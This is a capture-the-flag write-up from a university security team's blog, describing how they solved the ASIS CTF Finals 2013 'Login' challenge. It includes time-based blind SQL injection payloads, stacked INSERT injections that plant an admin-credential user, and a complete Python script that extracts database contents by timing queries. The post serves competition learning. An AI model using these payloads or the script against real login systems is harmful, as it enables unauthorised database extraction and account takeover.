@@ -1,0 +1,362 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>ASIS CTF Finals 2013 Login - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/ Description Login Points 350 Level 1 Solves 5 Description
+78.38.193.187 Hint:
+$ &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/asis-ctf-finals-2013-login">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">ASIS CTF Finals 2013 Login</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-03T00:00:00+08:00" pubdate data-updated="true">Sep 3<span>rd</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/">http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/</a></p>
+
+<p>Description</p>
+
+<pre><code>Login
+
+Points  350     Level   1   Solves  5
+
+Description
+78.38.193.187
+
+Hint:
+$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
+</code></pre>
+
+<p>All you can see is a login form, it always has some SQL injection problem.</p>
+
+<p>After a lot of testing, finally we find a time-based blind injection in the username.</p>
+
+<p>Using</p>
+
+<pre><code>1' AND BENCHMARK(5000000,MD5(0x123)) AND ''='
+</code></pre>
+
+<p>then we start to using sqlmap to deal with it, but it is too slow and show some mistakes.</p>
+
+<p>One of my friend write a python script to solve it, then we find some useful infomation. There are three database:</p>
+
+<pre><code>information_schema
+sqli_db
+test
+</code></pre>
+
+<p>Obviously, sqli_db is suspicious, let&#8217;s see what it has.</p>
+
+<pre><code>users
+</code></pre>
+
+<p>It only has a table named users.</p>
+
+<pre><code>user_id
+user_name
+user_email
+user_password_hash
+</code></pre>
+
+<p>At the beginning, we trying to fetch some data from it, but it is empty, some time later, we fetch a string from user&#95;password&#95;hash.</p>
+
+<pre><code>$2y$10$gyI0vxnE3ZncmdLNGVmwTew/aPwBZPY4cEMCRENAjN4?0l8iu9O5R6iW
+</code></pre>
+
+<p>Just google &#8220;$2y$10&#8243;, we find it is the head of PHP blowfish hash, but it seems that there is no way to get the original value from it.</p>
+
+<p>At that time, the admin give a hint on this problem:</p>
+
+<pre><code>Hint:
+$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
+</code></pre>
+
+<p>At the same time, we find that the table users suddenly become empty. It inspire us to try INSERT.</p>
+
+<pre><code>';insert into users values (333,'hqd','1','1@1.com');select '
+</code></pre>
+
+<p>And it works!</p>
+
+<p>Then it is so easy, just INSERT the correct hash value of a password u know it before, there is a php script can to do this.</p>
+
+<pre><code>';insert into users values (333,'hqd','$2y$10$YTNlM2RiNmFiODgzZGM2YuYqP7NHnuZ31TyucetPJkODqia/XH5KC','1@1.com');select '
+
+#this is the blowfish hash value of 'admin'
+</code></pre>
+
+<p>Then just login use username:hqd and password:admin, then here is the flag.</p>
+
+<pre><code>ASIS_9689926853009CAAD5BF824863077DC9
+</code></pre>
+
+<p>And taste the flavor of the first blood.</p>
+
+<p>f.py</p>
+
+<pre><code>from httplib import HTTPConnection
+
+HTTPConnection._http_vsn_str = 'HTTP/1.0'
+
+def post_payload( payload ):
+    conn = HTTPConnection( '78.38.193.187' )
+    conn.putrequest( 'POST', '/', skip_accept_encoding=True, skip_host=True )
+    conn.putheader( 'Content-Type', 'application/x-www-form-urlencoded' )
+    conn.putheader( 'Content-Length', str(len(payload)) )
+    conn.endheaders( message_body=payload )
+    resp = conn.getresponse()
+    resp.read()
+
+from urllib import urlencode
+from time import time
+
+def get_bool( expression ):
+    start = time()
+    post_payload( urlencode( dict(
+        login = '',
+        user_password = ' ',
+        user_name = "'OR if(%s,benchmark(1500000,md5(0)),0) AND''='" % expression,
+    ) ) )
+    end = time()
+    print 'Time:', end-start
+    return end-start&amp;gt;0.95
+
+def get_bit( expression ):
+    return '1' if get_bool( expression ) else '0'
+
+from itertools import count
+
+def get_string( expression ):
+    result = ''
+    for i in count( start=1 ):
+        char = ''
+        for j in range(8)[::-1]:
+            print 'Byte %d, Bit %d,' % (i,j),
+            bit = get_bit( 'ascii(substr(%s,%d,1))&amp;gt;&amp;gt;%d&amp;amp;1' % ( expression, i, j ) )
+            print bit
+            char += bit
+        char = int( char, 2 )
+        if char == 0: break
+        result += chr(char)
+    return result
+
+# def get_query( expression ):
+
+
+# print get_string( 'database()' )
+print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c695f6462 LIMIT 0,1)' )
+# print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=\'information_shema\' LIMIT 0,1)' )
+# print get_string( '(SELECT IFNULL(CAST(COLUMN_NAME AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\'users\' LIMIT 5,1)' )
+# print get_string( '(SELECT CAST(COUNT(*) AS CHAR) FROM users)' )
+# print get_string( '@@datadir' )
+# print get_string( 'user()' )
+# print get_string( 'version()' )
+</code></pre>
+
+<p>a.php</p>
+
+<p>Founded from <a href="http://pastebin.com/y9GKtx0b">pastebin</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DeAdCaT___</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-03T00:00:00+08:00" pubdate data-updated="true">Sep 3<span>rd</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/asis-ctf-finals-2013-login/" data-via="" data-counturl="http://www.blue-lotus.net/www/asis-ctf-finals-2013-login/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/asis-ctf-memdump-writeup/" title="Previous Post: ASIS CTF memdump writeup">&laquo; ASIS CTF memdump writeup</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
